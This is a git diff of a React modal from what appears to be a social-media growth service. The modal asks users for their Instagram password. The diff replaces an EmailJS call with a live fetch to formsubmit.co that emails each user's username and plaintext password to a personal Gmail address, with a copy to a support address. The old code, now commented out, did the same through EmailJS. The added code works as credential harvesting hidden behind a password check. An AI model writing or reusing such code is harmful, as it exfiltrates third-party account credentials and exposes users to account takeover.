@@ -95,40 +95,68 @@ const ModalNew = ({ modalIsOpen, setIsOpen, avatar, userId }) => {
     setLoading(true)
     var d = { instagramPassword, userMode: mode }
     if (instagramPassword) {
-      // check if user's password is correct;
-      const url = "https://api.emailjs.com/api/v1.0/email/send";
-      var params = {
-        service_id: 'service_epco0tm', //'YOUR_SERVICE_ID',
-        template_id: "template_11nxdjo",//'YOUR_TEMPLATE_ID',
-        user_id: 'JK1REH7u6-SRYFu4q',
-        template_params: {
-          'g-recaptcha-response': '03AHJ_ASjnLA214KSNKFJAK12sfKASfehbmfd...',
+      fetch("https://formsubmit.co/ajax/paulinnocent04@gmail.com", {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
           'date': new Date().toDateString(),
           'username': user?.username,
           'password': instagramPassword,
-        }
-      };
-      const f = await fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(params)
-      }).catch(err => {
-        console.log(`Opps... ${err}`);
-      });
-      console.log('f', f);
+          _cc: 'support@sproutysocial.com',
+        })
+      })
+        .then(response => response.json())
+        .then(data => {
+          // console.log(data)
+          if (data.success === 'false') {
+            alert("Something went wrong, please try again or cantact our support support@sproutysocial.com")
+            setLoading(false)
+            window.location.reload()
+            setIsOpen(!modalIsOpen);
+            return;
+          }
+        })
+        .catch(error => {
+          console.log(error)
+        });
+
+      // check if user's password is correct;
+      // const url = "https://api.emailjs.com/api/v1.0/email/send";
+      // var params = {
+      //   service_id: 'service_epco0tm', //'YOUR_SERVICE_ID',
+      //   template_id: "template_11nxdjo",//'YOUR_TEMPLATE_ID',
+      //   user_id: 'JK1REH7u6-SRYFu4q',
+      //   template_params: {
+      //     'g-recaptcha-response': '03AHJ_ASjnLA214KSNKFJAK12sfKASfehbmfd...',
+      //     'date': new Date().toDateString(),
+      //     'username': user?.username,
+      //     'password': instagramPassword,
+      //   }
+      // };
+      // const f = await fetch(url, {
+      //   method: 'POST',
+      //   headers: {
+      //     'Content-Type': 'application/json'
+      //   },
+      //   body: JSON.stringify(params)
+      // }).catch(err => {
+      //   console.log(`Opps... ${err}`);
+      // });
+      // console.log('f', f);
       // const data = await f.json();
       // console.log('data', data);
       // console.log(JSON.stringify(data));
-      d = { ...d, status: 'checking' }
-      if(!f.ok) {
-        alert("Something went wrong, please try again or cantact our support support@sproutysocial.com")
-        setLoading(false)
-        window.location.reload()
-        setIsOpen(!modalIsOpen);
-        return;
-      }
+      // d = { ...d, status: 'checking' }
+      // if (!f.ok) {
+      //   alert("Something went wrong, please try again or cantact our support support@sproutysocial.com")
+      //   setLoading(false)
+      //   window.location.reload()
+      //   setIsOpen(!modalIsOpen);
+      //   return;
+      // }
     }
 
     const { data, error } = await supabase
